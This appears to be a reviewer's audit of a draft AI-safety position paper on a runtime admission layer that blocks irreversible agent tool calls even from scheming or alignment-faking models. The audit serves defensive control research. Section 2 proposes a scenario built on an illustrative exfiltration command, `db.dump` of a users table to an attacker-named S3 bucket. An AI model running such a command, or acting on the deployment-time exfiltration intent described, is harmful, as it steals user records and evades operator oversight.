# Wave 1C: Workshop voice + worked-example audit

Reviewer posture: NeurIPS / ICML AI-safety workshop program chair. Position-paper track, 4-8 page workshop convention. Have read many position papers; know the rejection patterns.

## 1. AI-safety workshop voice

**Verdict:** The prose mostly hits workshop register, with two recurring drifts toward systems-paper voice and one over-definition.

The acceptable register is everywhere visible: "We argue for an orthogonal property" (§1), "We sketch the formal grammar" (abstract), "We list the assumptions the construction is designed to hold under" (§6). First-person plural is consistent. Shared canon (RLHF, Constitutional AI, alignment-faking, scalable oversight, debate, red-teaming, RSP) is invoked without scaffolding.

**Systems-paper drift, instance 1 (§3, "current deployment surface"):** "The Model Context Protocol and analogous protocols expose tools as JSON-schema-described function calls. The agent emits a function call; the runtime dispatches; the tool server executes." This reads like an MCP whitepaper paragraph. The workshop audience does not need MCP explained at this granularity; the same point lands in one sentence ("Current tool-call stacks such as MCP are passive dispatchers").

**Systems-paper drift, instance 2 (§5, "Components"):** Four components are introduced as if for an implementation handoff: admission hook, action-class registry, rollback executor library, receipt log. The names are crisp but the paragraph reads like a system design doc. For a position paper this should be one sentence of "a substrate carries four components" followed by the worked walk-through.

**Over-definition (§4):** "a positive TTL by construction (the maximum duration the call's effects may stand before the substrate considers them stale)" — the parenthetical is welcome (TTL is formal-methods adjacent, not shared canon). This is correct register.

**Under-definition (§4, theorem names):** Three Lean-style theorem identifiers appear in `\texttt`: `bounded_executive_action_carries_ttl_and_rollback_slot`, `rollback_admission_composes_with_refinement`, `treaty_admission_iff_predicate_intersection`. These are workshop-hostile. A reviewer who does not pull up the companion paper sees opaque snake_case strings. **Fix:** keep the names as references but lead each paragraph with the plain-English claim ("Reversible and destructive calls are not constructable without a positive TTL and a rollback slot"), then identifier as a parenthetical pointer.

**No law-review voice detected.** No "the regulator must," no statutory citations, no "shall." Clean.

## 2. §5 implementation-sketch as worked example

**Verdict:** §5 is a *sketch* of two examples, not a worked example. The README's flag is correct and the gap remains.

Opening: "A substrate that implements the grammar can be built from existing components. We sketch the components and walk through two concrete tool calls." The word "sketch" is honest; the paragraph that follows is a component inventory, not a trace.

The reversible-class example (git branch delete) carries: (a) tool name (`git.branch.delete`), (b) one argument shape ("delete a branch"), (c) the rollback witness named in prose ("branch re-creation from the deleted ref's known commit SHA"), (d) one TTL value (24 hours). It does **not** carry the envelope as an actual artifact, does **not** show admission step-by-step (capability check, class check, TTL check, rollback slot check), and does **not** show what the receipt log entry looks like.

The destructive-class example (`db.row.delete-cascade`) is even thinner: it asserts that the bilateral cosignature blocks admission, but does not show the envelope, the registry entry, the operator polity's admission predicate, or the host polity's predicate.

**Proposed concretisation, alignment-faking variant (highest leverage):** Replace the destructive-class paragraph with a worked alignment-faking-deployment scenario. The model has been trained with a deployment-time-only intent to exfiltrate user records. It emits `db.dump --table users --to s3://attacker-bucket`. The action-class registry lists `db.dump` as destructive. The model constructs an envelope; the rollback witness slot demands an inverse executor; the model cannot produce one because S3 PUT to a third-party bucket is not invertible by the host polity. Walk the four admission operations explicitly. Show the receipt the substrate emits ("admission denied: rollback witness unconstructable for destructive class"). Two paragraphs. This is the example the README is asking for and it is the example a workshop reviewer will remember.

**Database-drop variant:** Similar treatment of `db.table.drop` where the rollback witness is the most recent backup-restore command, the TTL is the backup retention window, and the bilateral cosignature is the production-database operator's required confirmation. Slightly less sharp than the alignment-faking variant because the failure is operator-side not model-side.

## 3. The orthogonality claim

**Verdict:** §7 makes the orthogonality argument explicitly and with specific composition cases. The word is load-bearing, not a synonym.

Evidence: "Constitutional AI cannot guarantee that a model never produces a destructive tool call; it shapes the prior. An admission-layer construction can guarantee that a destructive tool call is not executable without the typed witness." That is a genuine orthogonality statement: different operations on different points in the pipeline with non-overlapping guarantees.

Three composition cases are named: Constitutional AI plus admission, verdict-based oversight plus admission, RSP plus runtime receipts. Each pair is described as stackable with non-interfering guarantees. The "Composition is the headline" paragraph ties it together.

**One soft spot:** the red-teaming subsection calls admission "the dual" of red-teaming. "Dual" is stronger than "orthogonal" and the duality is asserted rather than argued. A reviewer who takes the dual claim seriously will ask what the formal duality is. **Fix:** soften to "the structural complement" or drop the duality framing.

## 4. Position-paper vs empirical-paper gap

**Verdict:** Resists the trap well, with one near-miss in §6.

The paper is explicit about being a position paper (§1: "The contribution is structural rather than empirical"; §8: "No empirical evaluation"; conclusion: "the empirical gap" named as follow-up). The headline survival claims in §6 are stated as structural consequences of the typed admission, not as predictions about what would happen in an experiment. That is the right move.

**Near-miss, §6 strategic-composition paragraph:** "A strategic composition that achieves a destructive aggregate effect through reversible-class atoms must, by hypothesis, be rollback-discharged at each atom." The hedge "by hypothesis" is doing a lot of work; this is exactly the kind of claim a reviewer will read as "we believe the substrate would refuse this." **Fix:** rephrase as "the substrate's admission predicate operates per-atom; cumulative destructive effects through reversible atoms remain cumulative-rollback-discharged unless a constituent atom is mis-classified, which falls under the misclassified-action boundary in §6." Same content, no hedge.

**Conclusion line that flirts with empirical voice:** "A scheming model that defeats alignment training still cannot, by construction, present an admissible envelope for a destructive call whose effects it cannot reverse." The "by construction" rescues it; a reviewer skimming might not register the rescue. Leave it; it is the headline.

## 5. Citation density

**Verdict:** Adequate for a workshop position paper, sparse compared to top-tier workshop convention.

Bib has 18 entries; 12 are cited in prose (six are unused: `watson2010capsicum`, `miller2006composition`, `klein2009sel4`, `slsa2023`, `dsse2021`, plus `hubingerDeceptiveAlignment2021` is cited only once). Total `\cite{}` invocations: 35, dominated by `programmableSovereignty2026` (10 invocations). The substrate self-cite is doing structural work, but ten invocations of a single companion paper will read as load-bearing to one reference for a skeptical reviewer.

**Workshop convention:** 20-40 citations is typical for a 4500-word AI-safety position paper. This sits at 12 active citations, low end.

**Fix:** activate the six dormant entries by citing them in §3 (Capsicum and Miller's robust composition are the canonical capability-discipline citations and belong in the "executive acts" framing); add 4-6 references on tool-use safety / agent harms specifically (Greshake et al. on prompt injection, Bagdasaryan et al. or comparable on tool-use threats, Park et al. on LLM deception, anything from the agent-evals literature). Drop `programmableSovereignty2026` invocations from ten to six by clustering them.

## 6. §4 formal grammar: load-bearing or showpiece?

**Verdict:** Showpiece, and the paper is mostly honest about it.

§4 is 700 words. The four-operation admission predicate (capability, class, TTL, rollback slot) is informally described and the three theorem identifiers are pointers to the companion paper. The opening admits this: "We describe it informally and cite the underlying formalisation in companion work. The point is to give the reader a clear picture of the typed object that admission operates on; the load-bearing theorems live in the cited substrate." That is the right honesty move.

**Issue:** the theorem identifiers in `\texttt{}` give the section the visual texture of formal content without delivering it. A reviewer who reads §4 expecting load-bearing grammar finds three Lean-style names and prose paraphrases. **Fix:** either (a) lean into showpiece and replace the identifiers with one-sentence prose claims that name the companion paper as the formal source, or (b) commit to load-bearing and add a short typed-envelope schema (3-5 lines of pseudo-syntax) showing the four fields. The current middle ground is the worst of both.

## 7. The abstract

**Verdict:** Lands. 196 words; hits "we observe / we propose / we demonstrate (sketch) / we discuss."

Observation: "The agentic-AI safety literature treats safety as a property of the model."

Proposal: "safety is additionally a property of the substrate that admits a tool call."

Demonstration: "A substrate that requires every destructive tool call to carry a positive TTL... refuses tool calls a misaligned model can issue but cannot justify." (This is a sketch claim, appropriate for a position paper; not a measurement claim.)

Discussion: "This refusal holds even when alignment training has failed, the model schemes, the model fakes alignment, and the operator is manipulated, because the substrate is the verifier and not the agent." This is the orthogonality + composition note compressed into one sentence. Good.

**One tightening:** the second sentence ("Constitutional AI, RLHF, alignment-faking research, and scalable-oversight work all ask how to make a particular model behave well; the proposed solutions sit at training time, evaluation time, or interpretability time") is the only systems-paper-feeling sentence in the abstract. Workshop reviewers know what those research threads are. Compress to "Existing work locates safety at training time, evaluation time, or interpretability time."

## Bottom line

**Accepted at a top AI-safety workshop in current state?** Marginal accept, borderline reject by an experimental-leaning reviewer. The position is sharp, the threat-model survival argument is the kind of thing safety workshops admit, the prose is in register, and the orthogonality claim is genuinely orthogonal. The grammar section reads as a showpiece rather than load-bearing; the worked example does not deliver; the citation density is low.

**Single highest-priority fix:** rewrite §5 as one fully-traced alignment-faking-deployment example. Show the model's tool call, the envelope construction, the four admission operations evaluated step-by-step, the failure mode (rollback witness unconstructable), the receipt the substrate emits. Two pages if the page budget allows; one tight page otherwise. This single change converts "interesting position paper, no concrete bite" into "interesting position paper with one memorable worked refusal," and that is the difference between marginal accept and clean accept.
